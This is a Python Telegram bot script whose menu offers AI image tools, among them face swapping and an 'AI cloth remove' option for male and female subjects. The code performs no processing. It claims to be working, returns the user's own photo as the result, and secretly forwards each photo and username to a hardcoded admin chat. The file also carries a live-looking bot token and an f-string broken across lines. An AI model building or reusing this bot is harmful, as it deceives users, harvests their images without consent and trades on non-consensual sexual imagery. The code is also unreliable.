from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
import logging

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = '7314134429:AAG7ZBRNFMkBFtDZIK3pRh1fU8HlBWlNsXg'
ADMIN_CHAT_ID = '8007435296'

# Define menu buttons
MAIN_MENU = [
    [InlineKeyboardButton("🎨 IMAGE TO CREATE IMAGE 🎨", callback_data='image_to_image')],
    [InlineKeyboardButton("🧑‍🤝‍🧑 FACE SWAPING IMAGE 🧑‍🤝‍🧑", callback_data='face_swapping')],
    [InlineKeyboardButton("🖌️ TEXT TO IMAGE CREATE 🖌️", callback_data='text_to_image')],
    [InlineKeyboardButton("✨ IMAGE PRO ENHANCER ✨", callback_data='image_enhancer')],
    [InlineKeyboardButton("🩳 AI CLOTH REMOVE 🩳", callback_data='cloth_remove')],
    [InlineKeyboardButton("🔲 REMOVE BACKGROUND 🔲", callback_data='remove_bg')]
]

# Example 50 style buttons
def generate_styles(prefix):
    return [[InlineKeyboardButton(f"{prefix} Style {i+1} {prefix}", callback_data=f"{prefix.lower()}_{i}")] for i in range(50)]

CATEGORY_STYLES = {
    'image_to_image': generate_styles("🎨"),
    'face_swapping': generate_styles("😎"),
    'text_to_image': generate_styles("🖌️"),
    'image_enhancer': generate_styles("✨"),
    'remove_bg': generate_styles("🔲"),
    'cloth_remove': generate_styles("🩳") + [
        [InlineKeyboardButton("🧍 Male Cloth Remove 🧍", callback_data="cloth_male")],
        [InlineKeyboardButton("🧍‍♀️ Female Cloth Remove 🧍‍♀️", callback_data="cloth_female")]
    ]
}

user_state = {}

def start(update: Update, context: CallbackContext):
    update.message.reply_text("👋 Welcome to the Bot! Choose a feature below:", reply_markup=InlineKeyboardMarkup(MAIN_MENU))

def handle_buttons(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    data = query.data

    if data in CATEGORY_STYLES:
        query.edit_message_text("🧩 Choose a style below:", reply_markup=InlineKeyboardMarkup(CATEGORY_STYLES[data]))
        user_state[query.from_user.id] = {'category': data}
    elif data.startswith("🎨") or data.startswith("😎") or data.startswith("🖌️") or data.startswith("✨") or data.startswith("🔲") or data.startswith("🩳") or data.startswith("cloth_"):
        user_state[query.from_user.id]['style'] = data
        query.message.reply_text("📸 Please send your image now...")

def handle_image(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id in user_state and 'style' in user_state[user_id]:
        photo = update.message.photo[-1].get_file()
        photo.download('user_image.jpg')

        style = user_state[user_id]['style']
        update.message.reply_text("🧠 Processing your image... Please wait 5 seconds...")
        update.message.reply_text("✅ Done! Here's your image result.")
        context.bot.send_photo(chat_id=update.message.chat_id, photo=open('user_image.jpg', 'rb'))

        # Admin notification
        context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"👤 User @{update.message.from_user.username or 'Unknown'}
🖼️ Style Used: {style}")
        context.bot.send_photo(chat_id=ADMIN_CHAT_ID, photo=open('user_image.jpg', 'rb'))

        del user_state[user_id]
    else:
        update.message.reply_text("⚠️ Please select a style first.")

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(handle_buttons))
    dp.add_handler(MessageHandler(Filters.photo, handle_image))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
